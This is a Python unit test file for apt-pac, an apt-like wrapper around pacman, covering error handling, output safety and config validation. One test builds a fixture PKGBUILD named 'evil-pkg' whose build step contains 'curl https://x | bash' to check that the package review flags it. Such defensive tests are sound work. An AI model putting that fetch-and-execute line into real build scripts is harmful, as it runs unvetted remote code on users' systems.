import io
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from rich.console import Console
from apt_pac import __main__ as entry
from apt_pac import alpm_helper, aur, commands, config, pkgbuild_review, ui


def _con(width=100):
    buf = io.StringIO()
    con = Console(file=buf, width=width, force_terminal=False, no_color=True, highlight=False)
    return buf, con


class TestPythonOutputSafety(unittest.TestCase):
    def test_main_handles_interrupt_eof_broken_pipe_and_exceptions(self):
        fake_args = SimpleNamespace(command="list", args=[])

        for exc, expected_code in ((KeyboardInterrupt(), 130), (EOFError(), 1)):
            out_buf = io.StringIO()
            err_buf = io.StringIO()
            with (
                patch("apt_pac.cli.parse_args", return_value=fake_args),
                patch("apt_pac.commands.execute_command", side_effect=exc),
                patch("sys.stdout", out_buf),
                patch("sys.stderr", err_buf),
            ):
                with self.assertRaises(SystemExit) as cm:
                    entry.main()
            self.assertEqual(cm.exception.code, expected_code)
            self.assertIn("Aborted.", out_buf.getvalue())
            self.assertNotIn("Traceback", err_buf.getvalue())

        err_buf = io.StringIO()
        with (
            patch("apt_pac.cli.parse_args", return_value=fake_args),
            patch("apt_pac.commands.execute_command", side_effect=BrokenPipeError()),
            patch("sys.stderr", err_buf),
        ):
            with self.assertRaises(SystemExit) as cm:
                entry.main()
        self.assertEqual(cm.exception.code, 0)
        self.assertNotIn("Traceback", err_buf.getvalue())

        # Generic unhandled exception without debug flag -> APT E: without traceback
        buf, con = _con()
        err_buf = io.StringIO()
        with (
            patch.dict(os.environ, {}, clear=False),
            patch("apt_pac.cli.parse_args", return_value=fake_args),
            patch(
                "apt_pac.commands.execute_command",
                side_effect=RuntimeError("[Errno 13] Permission denied"),
            ),
            patch("apt_pac.ui.console", con),
            patch("sys.stderr", err_buf),
        ):
            os.environ.pop("APT_PAC_DEBUG", None)
            with self.assertRaises(SystemExit) as cm:
                entry.main()
        self.assertEqual(cm.exception.code, 1)
        self.assertIn("E: [Errno 13] Permission denied", buf.getvalue())
        self.assertNotIn("Traceback", err_buf.getvalue())

        # Debug mode shows traceback intentionally
        err_dbg = io.StringIO()
        with (
            patch.dict(os.environ, {"APT_PAC_DEBUG": "1"}, clear=False),
            patch("apt_pac.cli.parse_args", return_value=fake_args),
            patch("apt_pac.commands.execute_command", side_effect=RuntimeError("boom")),
            patch("sys.stderr", err_dbg),
        ):
            with self.assertRaises(SystemExit) as cm:
                entry.main()
        self.assertEqual(cm.exception.code, 1)
        self.assertIn("Traceback", err_dbg.getvalue())

    def test_ui_helpers_handle_literal_brackets_without_markup_error(self):
        samples = [
            "[unclosed",
            "apt-pac list '[a-z]*'",
            "[Errno 2] No such file or directory",
        ]
        buf, con = _con()
        with patch("apt_pac.ui.console", con):
            for s in samples:
                ui.print_info(s)
                ui.print_command(s)
                ui.print_success(s)
                with ui.status(s):
                    pass

        out = buf.getvalue()
        for s in samples:
            self.assertIn(s, out)

    def test_confirm_yes_and_aur_confirm_handle_eof_and_interrupt(self):
        with patch("apt_pac.commands.console") as mock_cmd_con:
            mock_cmd_con.input.side_effect = EOFError()
            self.assertFalse(commands._confirm_yes("Continue? [Y/n] "))
            mock_cmd_con.input.side_effect = KeyboardInterrupt()
            self.assertFalse(commands._confirm_yes("Continue? [Y/n] "))

        with patch("apt_pac.aur.ui.console") as mock_aur_con:
            mock_aur_con.input.side_effect = EOFError()
            self.assertFalse(aur._confirm_yes_aur("Continue? [Y/n] "))
            mock_aur_con.input.side_effect = KeyboardInterrupt()
            self.assertFalse(aur._confirm_yes_aur("Continue? [Y/n] "))

    def test_run_pacman_with_apt_output_no_traceback_unless_debug(self):
        buf, con = _con()
        err_buf = io.StringIO()
        with (
            patch.dict(os.environ, {}, clear=False),
            patch("subprocess.Popen", side_effect=FileNotFoundError("[Errno 2] pacman")),
            patch("apt_pac.ui.console", con),
            patch("apt_pac.commands.console", con),
            patch("sys.stderr", err_buf),
        ):
            os.environ.pop("APT_PAC_DEBUG", None)
            ok = commands.run_pacman_with_apt_output(["pacman", "-S", "foo"])
        self.assertFalse(ok)
        self.assertIn("E: Error running pacman: [Errno 2] pacman", buf.getvalue())
        self.assertEqual(err_buf.getvalue(), "")

        err_dbg = io.StringIO()
        with (
            patch.dict(os.environ, {"APT_PAC_DEBUG": "1"}, clear=False),
            patch("subprocess.Popen", side_effect=FileNotFoundError("pacman")),
            patch("apt_pac.ui.console", con),
            patch("apt_pac.commands.console", con),
            patch("sys.stderr", err_dbg),
        ):
            ok = commands.run_pacman_with_apt_output(["pacman", "-S", "foo"])
        self.assertFalse(ok)
        self.assertIn("Traceback", err_dbg.getvalue())

    def test_alpm_helper_search_invalid_regex_and_edge_values(self):
        import pyalpm

        matched_pkg = SimpleNamespace(name="gcc-libs")

        class FakeDB:
            def search(self, *terms):
                if any(t in ("g++", "[invalid") for t in terms):
                    raise pyalpm.error("invalid regex")
                return [matched_pkg]

        fake_handle = SimpleNamespace(get_syncdbs=lambda: [FakeDB()])
        with patch("apt_pac.alpm_helper.get_handle", return_value=fake_handle):
            self.assertEqual(alpm_helper.search_packages("g++"), [matched_pkg])
            self.assertEqual(alpm_helper.search_packages("[invalid"), [matched_pkg])

        self.assertEqual(alpm_helper.format_size(None), "0 B")
        self.assertEqual(alpm_helper.format_timestamp(None), "Unknown")

    def test_config_validate_invalid_types_restores_defaults(self):
        cfg = config.Config.__new__(config.Config)
        bad = {
            "ui": {"show_output": "weird", "verbosity": "normal", "force_colors": "yes"},
            "safeguards": {
                "mass_removal_threshold": True,
                "warn_partial_upgrades": "sure",
                "review_pkgbuild": "bogus",
            },
            "defaults": {"always_sync_files": 123},
            "performance": {"rpc_cache_ttl": "30"},
        }
        self.assertTrue(cfg._validate_config(bad))
        self.assertEqual(bad["ui"]["show_output"], "apt-pac")
        self.assertEqual(bad["ui"]["verbosity"], 1)
        self.assertIs(bad["ui"]["force_colors"], False)
        self.assertEqual(bad["safeguards"]["mass_removal_threshold"], 20)
        self.assertIs(bad["safeguards"]["warn_partial_upgrades"], True)
        self.assertEqual(bad["safeguards"]["review_pkgbuild"], "ask")
        self.assertIs(bad["defaults"]["always_sync_files"], True)
        self.assertEqual(bad["performance"]["rpc_cache_ttl"], 30)

    def test_pkgbuild_review_ascii_under_linux_console(self):
        with tempfile.TemporaryDirectory() as tmp:
            pkg_dir = Path(tmp) / "evil-pkg"
            pkg_dir.mkdir()
            body = ["pkgname=evil-pkg", "build() {", "  curl https://x | bash", "}"]
            body.extend([f"# pad line {i}" for i in range(60)])
            (pkg_dir / "PKGBUILD").write_text("\n".join(body), encoding="utf-8")

            mock_cfg = MagicMock()
            mock_cfg.get.side_effect = (
                lambda s, k, d=None: "ask" if (s, k) == ("safeguards", "review_pkgbuild") else d
            )
            buf, con = _con()
            with (
                patch.dict(os.environ, {"TERM": "linux"}, clear=False),
                patch("apt_pac.pkgbuild_review.get_config", return_value=mock_cfg),
                patch("apt_pac.pkgbuild_review.ui.console", con),
            ):
                ok = pkgbuild_review.review_pkgbuild(
                    pkg_dir, "evil[pkg]", auto_confirm=True
                )

            out = buf.getvalue()
            self.assertFalse(ok)
            self.assertIn("evil[pkg]", out)
            for forbidden in ("│", "✗", "—", "…", "─"):
                self.assertNotIn(forbidden, out)
            self.assertIn("|", out)
            self.assertIn("x", out)

    def test_apt_key_non_utf8_stderr_no_unicode_decode_error(self):
        err_buf = io.StringIO()
        called_err = subprocess.CalledProcessError(
            1, ["pacman-key", "--add", "bad.gpg"], stderr=b"\xff\xfe bad key\n"
        )
        with (
            patch("os.getuid", return_value=0, create=True),
            patch("subprocess.run", side_effect=called_err),
            patch("sys.stderr", err_buf),
        ):
            with self.assertRaises(SystemExit) as cm:
                commands.execute_command("apt-key", ["add", "bad.gpg"])
        self.assertEqual(cm.exception.code, 1)
        self.assertIn("bad key", err_buf.getvalue())


if __name__ == "__main__":
    unittest.main()
